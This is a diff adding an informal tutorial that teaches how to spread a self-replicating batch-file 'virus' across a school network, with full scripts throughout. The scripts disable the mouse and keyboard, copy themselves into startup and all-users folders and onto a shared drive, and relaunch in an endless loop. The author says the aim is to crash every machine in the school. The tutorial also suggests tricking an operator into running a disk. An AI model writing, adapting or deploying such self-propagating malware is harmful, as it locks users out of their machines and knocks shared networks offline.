@@ -1,0 +1,159 @@
+this tutorial is going to explain how to spread a batch file thru a network.
+it is needed to know the basics of batch first, and you must go learn a more complicated language like c++ or VBScript
+
+#################
+1) introduction #
+#################
+
+ok so you know the basics on batch and are willing to learn more about it. 
+Well you can. In this tutorial there will be 3 ways explained on how to spread a virus.  :buttrock:
+small list of commands that must be known ELSE STOP READING THIS AND LOOK FOR Batch for Idiots I and II
+
+### Code ###
+echo - basic echo command
+@echo off - not displaying commands
+cls - clearing screen
+copy %0 - copy the running file
+copy - copy a file
+cd - current directory
+pause - waiting for user to press a button
+>nul - not displaying a command
+>> - placing the text to the end of a file
+### Code ###
+
+##################
+2) The first way #
+##################
+now i know you are all curious about how to spread it but let's first make a code to spread...
+i have made this
+
+### Code ###
+:start
+@echo off
+C:\Windows\rundll32.exe mouse,disable
+C:\Windows\rundll32.exe keyboard,disable
+set DM = dainamix.bat
+cls
+echo.
+echo #####
+echo # Spread Virus on LAN
+echo # Credit by: N-Cen-Dainamix
+echo #####
+echo (C) 2018 by: `Dainamix~Team`
+echo.
+if exist C:\%DM% del %0
+copy %0 C:\%DM%
+start C:\%DM%
+goto start
+### Code ###
+
+ok first what this "virus" does
+it echos all bullshit sets DM as dainamix.bat copys itself to DM and starts DM
+now we want to make this file go all around the school network because we really hate the dainamix  :angry:
+we add this code
+
+### Code ###
+:mid
+if exist C:\winDM goto winDM
+copy %0 C:\windows\AllUse~1\Applic~1\dainamix.bat
+copy %0 C:\windows\alluse~1\Destkop\dainamix.bat
+copy %0 C:\windows\alluse~1\startm~1\dainamix.bat
+copy %0 C:\windows\alluse~1\startm~1\progra~1\dainamix.bat
+goto end
+:winDM
+copy %0 C:\winDM\AllUse~1\Applic~1\dainamix.bat
+copy %0 C:\winDM\alluse~1\Destkop\dainamix.bat
+copy %0 C:\winDM\alluse~1\startm~1\dainamix.bat
+copy %0 C:\winDM\alluse~1\startm~1\progra~1\dainamix.bat
+goto end
+:end
+goto start
+### Code ###
+
+In the end the batch file should look like this
+
+### Code ###
+:start
+@echo off
+C:\windows\rundll32.exe mouse,disable
+C:\windows\rundll32.exe keyboard,disable
+set DM = dainamix.bat
+cls
+echo.
+echo #####
+echo # Spread Virus on LAN
+echo # Credit by: N-Cen-Dainamix
+echo #####
+echo (C) 2018 by: `Dainamix~Team`
+echo.
+if exist C:\%DM% del %0
+copy %0 C:\%DM%
+start C:\%DM%
+:mid
+if exist C:\winDM goto winDM
+copy %0 C:\windows\AllUse~1\Applic~1\dainamix.bat
+copy %0 C:\windows\alluse~1\Destkop\dainamix.bat
+copy %0 C:\windows\alluse~1\startm~1\dainamix.bat
+copy %0 C:\windows\alluse~1\startm~1\progra~1\dainamix.bat
+goto end
+:winDM
+copy %0 C:\winDM\AllUse~1\Applic~1\dainamix.bat
+copy %0 C:\winDM\alluse~1\Destkop\dainamix.bat
+copy %0 C:\winDM\alluse~1\startm~1\dainamix.bat
+copy %0 C:\winDM\alluse~1\startm~1\progra~1\dainamix.bat
+goto end
+:end
+goto start
+### Code ###
+
+Ok so that was the first way .. with this code it doesnt only really irritate someone but it also keeps making the file C:\dainamix.bat 
+bigger and bigger every 10 seconds the file is opened. 
+the more people that open the file the bigger the file gets. the formula for the file growth is = 120 x numberofusersthatopenedfile / 5 x 60
+so if 200 people on your school opens it you get a growth of 288000 KB per minute which is 281,25 MB per minute
+within 15 minutes every PC in the school will crash.
+
+###################
+3) The second way #
+###################
+
+This is far the easyiest way of spreading a virus... but it is most of the time insecure. 
+this is because you need to know what the name of the network drive on school 
+is at my school its H: so ill use that
+i use the same script as above
+
+### Code ###
+:start
+@echo off
+C:\windows\rundll32.exe mouse,disable
+C:\windows\rundll32.exe keyboard,disable
+set DM = dainamix.bat
+cls
+echo.
+echo #####
+echo # Spread Virus on LAN
+echo # Credit by: N-Cen-Dainamix
+echo #####
+echo (C) 2018 by: `Dainamix~Team`
+echo.   
+if exist C:\%DM% del %0
+copy %0 C:\%DM%
+start C:\%DM%
+copy %0 H:\docume~1\userli~1\dainamix.bat
+goto start
+### Code ###
+
+ok that wasnt so hard
+
+##################
+4) the third way #
+##################
+
+ask the operator to install the disk you have in your hand in the main networking computer...
+if he's stupid enough and does it only 1 person has 2 open it and the school is offline
+
+################
+5) what i want #
+################
+
+what i recommend is using the first method because its deadly.
+what i want is that noone uses the name dainamix exactly copys the scripts above or any of the code in it
